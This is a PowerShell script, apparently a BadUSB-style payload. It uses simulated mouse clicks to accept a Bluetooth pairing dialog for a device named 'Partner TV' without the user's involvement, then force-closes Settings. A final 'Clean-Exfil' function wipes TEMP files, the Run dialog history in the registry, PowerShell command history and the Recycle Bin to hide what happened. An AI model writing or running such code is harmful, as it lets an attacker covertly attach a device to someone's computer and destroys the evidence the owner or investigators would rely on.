# Add mouse click simulation functions
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class MouseSimulator
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SetCursorPos(int X, int Y);

    private const int MOUSEEVENTF_LEFTDOWN = 0x0002;
    private const int MOUSEEVENTF_LEFTUP = 0x0004;

    public static void ClickAt(int x, int y)
    {
        SetCursorPos(x, y);
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    }
}
"@

# Add function to calculate the bottom-right corner position
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ScreenHelper
{
    [DllImport("user32.dll")]
    public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MonitorInfo lpmi);

    [DllImport("user32.dll")]
    public static extern IntPtr MonitorFromWindow(IntPtr hwnd, int dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    public struct MonitorInfo
    {
        public int cbSize;
        public Rect rcMonitor;
        public Rect rcWork;
        public int dwFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct Rect
    {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }

    public static Tuple<int, int> GetBottomRightCorner()
    {
        var mi = new MonitorInfo();
        mi.cbSize = Marshal.SizeOf(mi);
        GetMonitorInfo(MonitorFromWindow(IntPtr.Zero, 2), ref mi);

        return new Tuple<int, int>(mi.rcMonitor.Right, mi.rcMonitor.Bottom);
    }

    public static Tuple<int, int> GetNotificationAreaPosition()
    {
        int screenWidth = GetBottomRightCorner().Item1;
        int screenHeight = GetBottomRightCorner().Item2;

        int x = screenWidth - 50;
        int y = screenHeight - 100;

        return new Tuple<int, int>(x, y);
    }
}
"@

# Add function to get window position
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class WindowHelper
{
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    public static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);

    [StructLayout(LayoutKind.Sequential)]
    public struct RECT
    {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }

    public static Tuple<int, int> GetWindowPosition(string windowTitle)
    {
        var hWnd = FindWindow(null, windowTitle);
        if (hWnd != IntPtr.Zero)
        {
            RECT rect;
            if (GetWindowRect(hWnd, out rect))
            {
                return new Tuple<int, int>(rect.Left + (rect.Right - rect.Left) / 2, rect.Top + (rect.Bottom - rect.Top) / 2);
            }
        }
        return new Tuple<int, int>(-1, -1);
    }
}
"@

function Invoke-MouseClick {
    param (
        [Parameter(Mandatory=$true)]
        [int]$X,
        
        [Parameter(Mandatory=$true)]
        [int]$Y
    )

    [MouseSimulator]::ClickAt($X, $Y)
}

function Get-ScreenBottomRight {
    [Tuple[int, int]]$position = [ScreenHelper]::GetBottomRightCorner()
    return $position
}

function Get-NotificationAreaPosition {
    [Tuple[int, int]]$position = [ScreenHelper]::GetNotificationAreaPosition()
    return $position
}

function Close-SettingsApp {
    $settingsProcess = Get-Process | Where-Object {$_.ProcessName -eq "SystemSettings"}
    if ($settingsProcess) {
        $settingsProcess | ForEach-Object { $_.CloseMainWindow() }
        Start-Sleep -Seconds 1
        $settingsProcess | Where-Object {!$_.HasExited} | Stop-Process -Force
    }
}

function Connect-BluetoothDevice {
    param (
        [string]$DeviceName,
        [switch]$ListDevices,
        [switch]$Connect,
        [int]$ClickX,
        [int]$ClickY
    )

    Add-Type -AssemblyName System.Runtime.WindowsRuntime

    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]

    Function Await($WinRtTask, $ResultType) {
        $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
        $netTask = $asTask.Invoke($null, @($WinRtTask))
        $netTask.Wait(-1) | Out-Null
        $netTask.Result
    }

    $bluetoothAPI = [Windows.Devices.Bluetooth.BluetoothLEDevice, Windows.System.Devices, ContentType = WindowsRuntime]
    $deviceInfoAPI = [Windows.Devices.Enumeration.DeviceInformation, Windows.System.Devices, ContentType = WindowsRuntime]
    $gattDeviceServiceAPI = [Windows.Devices.Bluetooth.GenericAttributeProfile.GattDeviceService, Windows.System.Devices, ContentType = WindowsRuntime]

    if ($ListDevices) {
        # Get paired devices
        $pairedSelector = $bluetoothAPI::GetDeviceSelectorFromPairingState($true)
        $pairedTask = $deviceInfoAPI::FindAllAsync($pairedSelector)
        $pairedDevices = Await $pairedTask ([Windows.Devices.Enumeration.DeviceInformationCollection])
        
        # Get available (unpaired) devices
        $unpairedSelector = $bluetoothAPI::GetDeviceSelectorFromPairingState($false)
        $unpairedTask = $deviceInfoAPI::FindAllAsync($unpairedSelector)
        $unpairedDevices = Await $unpairedTask ([Windows.Devices.Enumeration.DeviceInformationCollection])
        
        return
    }

    if ($Connect) {
        # Get available (unpaired) devices
        $unpairedSelector = $bluetoothAPI::GetDeviceSelectorFromPairingState($false)
        $unpairedTask = $deviceInfoAPI::FindAllAsync($unpairedSelector)
        $unpairedDevices = Await $unpairedTask ([Windows.Devices.Enumeration.DeviceInformationCollection])
        
        $device = $unpairedDevices | Where-Object { $_.Name -eq $DeviceName }
        if ($device) {
            $deviceLE = Await $bluetoothAPI::FromIdAsync($device.Id) ([Windows.Devices.Bluetooth.BluetoothLEDevice])
            $gattServices = Await $deviceLE.GetGattServicesAsync() ([Windows.Devices.Bluetooth.GenericAttributeProfile.GattDeviceServicesResult])
            if ($gattServices.Status -eq "Success") {
                if ($ClickX -ne $null -and $ClickY -ne $null) {
                    Invoke-MouseClick -X $ClickX -Y $ClickY
                    Start-Sleep -Seconds 1.5

                    $windowPos = [WindowHelper]::GetWindowPosition("Pair Device")
                    if ($windowPos.Item1 -ne -1 -and $windowPos.Item2 -ne -1) {
                        Invoke-MouseClick -X ($windowPos.Item1 - 50) -Y ($windowPos.Item2 + 50)
                        Start-Sleep -Seconds 1
                        Invoke-MouseClick -X ($windowPos.Item1 + 100) -Y ($windowPos.Item2 + 10)
						Close-SettingsApp
                    }
                }
            }
        }
    }
}

Connect-BluetoothDevice -Connect -DeviceName "Partner TV" -ClickX (Get-NotificationAreaPosition).Item1 -ClickY (Get-NotificationAreaPosition).Item2

############################################################################################################################################################

function Clean-Exfil { 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

Clean-Exfil